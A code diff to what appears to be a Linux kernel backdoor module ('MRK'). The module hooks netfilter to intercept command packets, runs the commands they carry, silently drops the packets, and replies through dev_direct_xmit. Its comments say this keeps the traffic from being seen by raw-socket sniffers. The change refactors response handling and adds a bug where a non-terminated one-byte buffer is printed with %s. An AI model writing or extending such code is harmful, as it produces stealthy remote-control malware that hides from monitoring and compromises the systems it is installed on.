@@ -18,6 +18,15 @@
 
 typedef u16 job_id_t;
 
+struct origin {
+    job_id_t job_id;
+    __be32 remote_addr;
+    __be32 local_addr;
+    __be16 remote_port;
+    unsigned char remote_mac[ETH_ALEN];
+    struct net_device *dev;
+};
+
 struct cmd_type {
     char *name;
     int (*func)(const char *path);
@@ -53,20 +62,16 @@ struct cmd_type cmds[] = {
 
 
 static int send_response(
-    job_id_t job_id,
-    char response_status,
-    __be32 local_ip,
-    __be32 remote_ip,
-    __be16 remote_port,    
-    unsigned char remote_mac[ETH_ALEN],
-    struct net_device *dev
+    struct origin origin,
+    char *response,
+    size_t response_len
 ) {
     struct iphdr *iph = NULL;
     struct udphdr *udph = NULL;
     struct ethhdr *eth = NULL;
     struct sk_buff *skb = NULL;
     char *data = NULL;
-    printk(KERN_INFO "returning response %d for job id %u\n", response_status, job_id);
+    printk(KERN_INFO "returning response for job id %u\n", origin.job_id);
     skb = alloc_skb(RESPONSE_DATA_LEN + RESPONSE_HEADER_LEN, GFP_ATOMIC);
     if (!skb) {
         printk(KERN_INFO "failed allocating skb\n");
@@ -76,19 +81,19 @@ static int send_response(
     data = skb_put(skb, RESPONSE_DATA_LEN);
 
     // put response data.
-    *(unsigned short *)data = job_id;
-    put_unaligned(response_status, data + 2);
+    *(unsigned short *)data = origin.job_id;
+    memcpy(data + 2, response, response_len);
 
     skb_push(skb, sizeof(struct udphdr));
     skb_reset_transport_header(skb);
     udph = udp_hdr(skb);
     udph->source = htons(CMD_PORT);
-    udph->dest = remote_port;
+    udph->dest = origin.remote_port;
     udph->len = htons(RESPONSE_DATA_LEN + sizeof(struct udphdr));
     udph->check = 0;
     udph->check = csum_tcpudp_magic(
-        local_ip,
-        remote_ip,
+        origin.local_addr,
+        origin.remote_addr,
         RESPONSE_DATA_LEN + sizeof(struct udphdr),
         IPPROTO_UDP,
         csum_partial(
@@ -112,17 +117,17 @@ static int send_response(
     iph->ttl      = IPDEFTTL;
     iph->protocol = IPPROTO_UDP;
     iph->check    = 0;
-    iph->saddr = local_ip;
-    iph->daddr = remote_ip;
+    iph->saddr = origin.local_addr;
+    iph->daddr = origin.remote_addr;
     iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);
 
     eth = (struct ethhdr *) skb_push(skb, ETH_HLEN);
     skb_reset_mac_header(skb);
     skb->protocol = eth->h_proto = htons(ETH_P_IP);
-    memcpy(eth->h_source, dev->dev_addr, ETH_ALEN);
-    memcpy(eth->h_dest, remote_mac, ETH_ALEN);
+    memcpy(eth->h_source, origin.dev->dev_addr, ETH_ALEN);
+    memcpy(eth->h_dest, origin.remote_mac, ETH_ALEN);
 
-    skb->dev = dev;
+    skb->dev = origin.dev;
 
     // We want to trasmit the packet directly so it won't be accounted or sniffed by raw sockets.
     // Therefore, we use `dev_direct_xmit` instead of the standard `dev_queue_xmit`.
@@ -137,27 +142,18 @@ struct MRK_command_work {
     struct work_struct work;
     struct cmd_type *cmd;
     const char *arg;
-    job_id_t job_id;
-    __be32 remote_addr;
-    __be32 local_addr;
-    __be16 remote_port;
-    unsigned char remote_mac[ETH_ALEN];
-    struct net_device *dev;
+    struct origin origin;
 };
 
 static void handle_command(struct work_struct *work) {
-    int result = -1;
+    char result[1] = {-1};
     struct MRK_command_work *command_work = container_of(work, struct MRK_command_work, work);
-    result = command_work->cmd->func(command_work->arg);
-    printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", command_work->cmd->name, result);
+    result[0] = command_work->cmd->func(command_work->arg);
+    printk(KERN_INFO "Found %s cmd packet! executed with code %s\n", command_work->cmd->name, result);
     send_response(
-        command_work->job_id, 
-        result, 
-        command_work->local_addr,
-        command_work->remote_addr,
-        command_work->remote_port,
-        command_work->remote_mac,
-        command_work->dev
+        command_work->origin, 
+        result,
+        sizeof(result)
     );
     // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
     // It is permissible to free the struct work_struct from inside the function that is called from it.
@@ -249,12 +245,12 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     memcpy(arg, user_data, user_data_len);
     arg[user_data_len] = '\0';
     command_work->arg = arg;
-    command_work->job_id = job_id;
-    command_work->local_addr = iph->daddr;
-    command_work->remote_addr = iph->saddr;
-    command_work->remote_port = udph->source;
-    memcpy(command_work->remote_mac, eth_hdr(skb)->h_source, ETH_ALEN);
-    command_work->dev = skb->dev;
+    command_work->origin.job_id = job_id;
+    command_work->origin.local_addr = iph->daddr;
+    command_work->origin.remote_addr = iph->saddr;
+    command_work->origin.remote_port = udph->source;
+    memcpy(command_work->origin.remote_mac, eth_hdr(skb)->h_source, ETH_ALEN);
+    command_work->origin.dev = skb->dev;
 
     schedule_work(&command_work->work);
     return NF_DROP;
